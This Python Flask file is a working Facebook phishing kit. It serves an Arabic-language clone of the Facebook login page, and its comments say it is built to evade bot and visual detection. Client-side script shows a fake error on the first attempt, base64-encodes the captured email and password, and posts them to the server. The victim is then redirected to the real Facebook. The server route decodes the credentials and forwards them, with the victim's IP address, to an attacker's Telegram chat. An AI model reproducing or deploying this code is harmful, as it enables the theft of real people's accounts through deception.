import os
import base64
import json
from flask import Blueprint, render_template_string, redirect, request

secure_fb_bp = Blueprint('facebook', __name__)

# قالب فيسبوك مطور هندسياً لمطابقة الأصول الحقيقية وتجاوز فحص الروبوتات
FB_PHISH_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول إلى فيسبوك</title>
    <style>
        body { background-color: #f0f2f5; font-family: SFProText-Regular, Helvetica, Arial, sans-serif; direction: rtl; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 100vh; }
        .main-content { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; flex: 1; padding: 20px 0; }
        .container { width: 396px; max-width: 90%; text-align: center; }
        .header-logo { margin-bottom: 20px; }
        .header-logo img { height: 106px; width: auto; margin: -28px; }
        .card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; text-align: center; }
        .card input { border: 1px solid #dddfe2; color: #1d2129; font-size: 16px; padding: 14px 16px; margin-bottom: 12px; width: 100%; border-radius: 6px; outline: none; box-sizing: border-box; background: #fff; }
        .card input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; line-height: 48px; padding: 0 16px; width: 100%; font-weight: bold; cursor: pointer; margin-bottom: 12px; transition: background-color 0.2s; }
        .login-btn:hover { background-color: #166fe5; }
        .error-box { background-color: #ffebe8; border: 1px solid #dd3c10; color: #333; padding: 10px; margin-bottom: 12px; border-radius: 4px; font-size: 13px; display: none; text-align: right; }
        .forgot-link { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-bottom: 20px; }
        .forgot-link:hover { text-decoration: underline; }
        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: #fff; font-size: 17px; font-weight: bold; line-height: 48px; padding: 0 16px; cursor: pointer; display: inline-block; text-decoration: none; transition: background-color: 0.2s; }
        .create-btn:hover { background-color: #36a420; }
        footer { color: #737373; font-size: 12px; padding: 20px; text-align: center; width: 100%; background: #ffffff; border-top: 1px solid #dddfe2; }
        footer div { margin-bottom: 8px; }
        footer a { color: #737373; text-decoration: none; margin: 0 8px; }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="container">
            <div class="header-logo">
                <!-- استخدام أيقونة رسمية وموثوقة لتقليل نسبة الكشف البصري والروبوتي -->
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
            </div>
            <div class="card">
                <div id="error-msg" class="error-box">كلمة السر التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.</div>
                <form method="POST" id="secureForm" onsubmit="handleAuth(event)">
                    <input type="text" id="u_val" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required autocomplete="username">
                    <input type="password" id="p_val" name="pass" placeholder="كلمة السر" required autocomplete="current-password">
                    <button type="submit" class="login-btn">تسجيل الدخول</button>
                    <a href="https://www.facebook.com/recover/initiate/" class="forgot-link">هل نسيت كلمة السر؟</a>
                    <hr>
                    <a href="https://www.facebook.com/r.php" class="create-btn">إنشاء حساب جديد</a>
                </form>
            </div>
        </div>
    </div>
    <footer>
        <div>العربية • English (US) • Français (France) • المزيد</div>
        <div>Meta © 2026 • اللغة والخصوصية والشروط</div>
    </footer>
    <script>
        let attempts = 0;
        function handleAuth(e) {
            e.preventDefault();
            const u = document.getElementById('u_val').value.trim();
            const p = document.getElementById('p_val').value.trim();
            const errBox = document.getElementById('error-msg');

            // محاكاة نظام التحقق الطبيعي لمنع الحسابات الوهمية والـ Bots
            if (attempts === 0 && (p.length < 6 || u.length < 4)) {
                errBox.style.display = 'block';
                attempts++;
                return;
            }

            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({ user: u, pass: p }))));
            
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: payload })
            }).then(() => {
                window.location.href = "https://www.facebook.com/login/";
            }).catch(() => {
                window.location.href = "https://www.facebook.com/login/";
            });
        }
    </script>
</body>
</html>
"""

def init_facebook_routes(app, bot):
    @app.route('/login.php', methods=['GET', 'POST'])
    def fb_trap():
        target_chat_id = request.args.get('id', None)
        
        if request.method == 'POST':
            req_data = request.json or {}
            encoded_data = req_data.get('data')
            
            user_val = "غير محدد"
            pass_val = "غير محدد"

            if not encoded_data:
                user_val = request.form.get('email', 'غير محدد')
                pass_val = request.form.get('pass', 'غير محدد')
            else:
                try:
                    decoded_bytes = base64.b64decode(encoded_data.encode('utf-8'))
                    parsed = json.loads(decoded_bytes.decode('utf-8', errors='ignore'))
                    user_val = parsed.get('user', 'غير محدد')
                    pass_val = parsed.get('pass', 'غير محدد')
                except Exception as e:
                    print(f"[-] Decryption Error: {e}")

            source_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            if ',' in source_ip:
                source_ip = source_ip.split(',')[0].strip()

            if target_chat_id and user_val != "غير محدد":
                alert_msg = (
                    "🚨 **تم التقاط صيد فيسبوك بنجاح وبشكل آمن!**\n"
                    "----------------------------------\n"
                    f"📌 **البريد/الهاتف:** `{user_val}`\n"
                    f"🔑 **كلمة المرور:** `{pass_val}`\n"
                    f"🌐 **عنوان الـ IP:** `{source_ip}`\n"
                    "----------------------------------"
                )
                try:
                    bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
                except Exception as e:
                    print(f"[-] Telegram Error: {e}")
                    
            return {"status": "redirect"}
            
        return render_template_string(FB_PHISH_TEMPLATE)
